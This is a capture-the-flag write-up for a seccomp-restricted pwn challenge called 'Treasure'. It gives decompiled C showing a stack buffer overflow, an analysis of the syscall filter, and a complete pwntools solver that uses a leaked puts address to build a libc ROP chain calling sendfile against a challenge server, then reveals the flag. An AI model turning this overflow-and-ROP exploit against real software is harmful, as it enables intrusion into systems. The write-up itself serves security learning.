---
description: A seccomp pwn challenge
---

# Treasure

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Given an ELF file, when we run it:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see it leaked an address and after approx. 1 second, it then triggers sig alarm. Then we proceed to decompile the binary using ida and got these functions:

Main:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
 _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF
 puts("where is the treasure?");
 read(0, buf, 160u);
 return 0;
}
```

sub\_12E9:

```c
int sub_12E9()
{
 void *v1; // [rsp+0h] [rbp-10h]
 int fd; // [rsp+Ch] [rbp-4h]
 setvbuf(stdin, 0, 2, 0);
 setvbuf(stdout, 0, 2, 0);
 setvbuf(stderr, 0, 2, 0);
 alarm(1u);
 fd = open("./flag", 0);
 if ( fd < 0 )
 {
 puts("hmmm");
 _exit(1);
 }
 if ( fd != 3 )
 {
 dup2(fd, 3);
 close(fd);
 }
 v1 = dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "puts");
 return printf("leaked: %p\n", v1);
}
```

sub\_13EB:<br>

```c
__int64 sub_13EB()
{
 __int64 v0; // r8
 __int64 v1; // r9
 __int64 v2; // r8
 ....
 __int64 v69; // [rsp+10h] [rbp-90h]
 __int64 v70; // [rsp+10h] [rbp-90h]
 __int64 v71; // [rsp+98h] [rbp-8h]
 
 v71 = seccomp_init(0);
 if ( !v71 )
 {
 puts("hmm");
 _exit(1);
 }
 seccomp_rule_add(v71, 2147418112, 0, 1, v0, v1, 0x400000000LL, 0, 0);
 seccomp_rule_add(v71, 2147418112, 1, 1, v2, v3, 0x400000000LL, 1, 0);
 seccomp_rule_add(v71, 2147418112, 1, 1, v4, v5, 0x400000000LL, 2, 0);
 seccomp_rule_add(v71, 2147418112, 40, 2, v6, v7, 0x400000000LL, 1, 0);
 seccomp_rule_add(v71, 2147418112, 3, 0, v8, v9, 0x400000001LL, 3, 0);
 seccomp_rule_add(v71, 2147418112, 60, 0, v10, v11, v35, v47, v59);
 seccomp_rule_add(v71, 2147418112, 231, 0, v12, v13, v36, v48, v60);
 seccomp_rule_add(v71, 2147418112, 35, 0, v14, v15, v37, v49, v61);
 seccomp_rule_add(v71, 2147418112, 15, 0, v16, v17, v38, v50, v62);
 seccomp_rule_add(v71, 0, 2, 0, v18, v19, v39, v51, v63);
 seccomp_rule_add(v71, 0, 257, 0, v20, v21, v40, v52, v64)
 eccomp_rule_add(v71, 0, 437, 0, v22, v23, v41, v53, v65);
 seccomp_rule_add(v71, 0, 10, 0, v24, v25, v42, v54, v66);
 seccomp_rule_add(v71, 0, 9, 0, v26, v27, v43, v55, v67);
 seccomp_rule_add(v71, 0, 25, 0, v28, v29, v44, v56, v68);
 seccomp_rule_add(v71, 0, 59, 0, v30, v31, v45, v57, v69);
 seccomp_rule_add(v71, 0, 322, 0, v32, v33, v46, v58, v70);
 if ( (unsigned int)seccomp_load(v71) )
 {
 puts("hmmm");
 _exit(1);
 }
 return seccomp_release(v71);
}
 
```

From these functions we get that there's a constructor that have a sig alarm(1), leaks libc puts address, and load ./flag to fd 3. There's also a seccomp setup that does:

* Allows only a small set of syscalls
* Blocks open, mmap, mprotect, execve
* Sendfile is allowed, and flag is already open as fd 3

So the exploit flow: get libc base from puts address -> build ROP chain that calls libc.sendfile -> send payload when read() is waiting.

solver.py:

```python
from pwn import *
import re

# --- config ---
BIN_PATH  = './treasure_patched'
LIBC_PATH = './libc.so.6'
HOST      = "143.198.215.203"
PORT      = 20037
# --------------

context.binary = ELF(BIN_PATH)
elf  = context.binary
libc = ELF(LIBC_PATH)

OFFSET = 72  # buf(64) + saved RBP(8)

def get_io():
    if HOST and PORT:
            return remote(HOST, PORT)
    else:
        return process(BIN_PATH)

def find_gadget_any(objs, mnem_list):
    for obj in objs:
        try:
            g = ROP(obj).find_gadget(mnem_list)
            if g: return g.address
        except Exception:
            pass
    return None

def build_chain(libc_base):
    libc.address = libc_base

    sendfile = libc.symbols.get('sendfile') or libc.symbols.get('sendfile64')
    assert sendfile, "No sendfile/sendfile64 in libc"

    rop = ROP(libc)
    try:
        rop.ret2ret()
    except Exception:
        try:
            rop.raw(ROP(libc).find_gadget(['ret']).address)
        except Exception:
            pass

    COUNT = 0x4000
    rop.call(sendfile, [1, 3, 0, COUNT])

    return rop.chain()


def parse_leak(line):
    m = re.search(rb'leaked:\s*(0x[0-9a-fA-F]+)', line)
    if not m:
        return None
    return int(m.group(1), 16)

def main():
    io = get_io()

    data = io.recvuntil(b'\n', drop=False, timeout=2) or b''
    buf  = data
    try:
        buf += io.recvuntil(b'where is the treasure?', timeout=1)
    except:
        pass

    log.info(buf.decode('latin-1', 'ignore'))

    leak = parse_leak(buf)
    if not leak:
        log.warning("Ga nemu leak di banner, coba recv lagi…")
        more = io.recvuntil(b'where is the treasure?', timeout=2)
        buf += more
        leak = parse_leak(buf)

    assert leak, "Tidak menemukan 'leaked: 0x...' dari constructor"

    log.success(f"puts leak      : {hex(leak)}")

    puts_off = libc.symbols['puts']
    libc_base = leak - puts_off
    log.success(f"libc base      : {hex(libc_base)}")

    payload  = b'A' * OFFSET
    payload += build_chain(libc_base)

    log.info(ROP(libc).dump())
    io.sendline(payload)

    io.shutdown('send')
    data = io.recv(timeout=2) or b''
    data += io.recv(timeout=2) or b''
    log.success(f"RECV ({len(data)} bytes):\n{data[:512]!r}")
    io.close()

    io.interactive()

if __name__ == '__main__':
    main()
```

When run we get the flag:

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

#### Flag: WRECKIT60{y0u\_g0t\_th3\_tr34sur3!!}
